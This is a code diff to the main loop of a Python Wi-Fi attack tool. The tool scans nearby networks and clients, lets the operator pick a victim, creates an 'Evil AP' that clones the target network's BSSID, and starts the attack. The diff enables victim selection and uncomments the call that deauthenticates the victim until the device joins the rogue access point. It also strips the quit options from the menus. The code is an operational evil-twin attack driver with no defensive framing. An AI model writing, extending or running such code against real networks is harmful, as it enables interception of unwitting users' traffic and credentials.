@@ -45,7 +45,7 @@ def main():
     sniffer = scan.start_sniff(iface)
 
     # Warm-up phase: 60 seconds
-    warmup = 5
+    warmup = 60
     print(f"Gathering data for {warmup}s before menu...")
     time.sleep(warmup)
 
@@ -53,11 +53,7 @@ def main():
         while True:
             display_networks()
             nets = scan.get_networks()
-            choice = input("Select network index, 'r' to refresh, 'q' to quit: ").strip().lower()
-            if choice == 'q':
-                scan.stop_sniff.set()
-                sniffer.join()
-                sys.exit(0)
+            choice = input("Select network index, 'r' to refresh:").strip().lower()
             if choice == 'r':
                 refresh = 5
                 print(f"Refreshing data for {refresh}s...")
@@ -74,20 +70,16 @@ def main():
             while True:
                 display_clients(bssid)
                 clients = scan.get_clients(bssid)
-                sub = input("Select client index, 'b' to go back, 'q' to quit: ").strip().lower()
-                if sub == 'q':
-                    scan.stop_sniff.set()
-                    sniffer.join()
-                    sys.exit(0)
+                sub = input("Select client index, 'b' to go back:").strip().lower()
                 if sub == 'b':
                     break
-                # if not sub.isdigit() or int(sub) not in range(len(clients)):
-                #     print("Invalid choice.")
-                #     continue
+                if not sub.isdigit() or int(sub) not in range(len(clients)):
+                    print("Invalid choice.")
+                    continue
 
-                # client_mac = list(clients.keys())[int(sub)]
-                # print(f"\nSelected AP: {ap_info['SSID']} ({bssid})")
-                # print(f"Selected Client: {client_mac}, Packets: {clients[client_mac]['pkt_count']}, Last Seen: {clients[client_mac]['last_seen']}")
+                client_mac = list(clients.keys())[int(sub)]
+                print(f"\nSelected AP: {ap_info['SSID']} ({bssid})")
+                print(f"Selected Client: {client_mac}, Packets: {clients[client_mac]['pkt_count']}, Last Seen: {clients[client_mac]['last_seen']}")
 
                 # 1) Create the fake AP configs & networking
                 print(f"\nCreating Evil AP with BSSID {bssid} on interface {ap_iface}...")
@@ -105,7 +97,7 @@ def main():
                 procs = attack.start_attack(ap_iface)
 
                 # 4) Deauth the victim until they associate to your Evil AP
-                # attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
+                attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
 
                 # 5) Stop sniffing now that the victim is “in”
                 scan.stop_sniff.set()
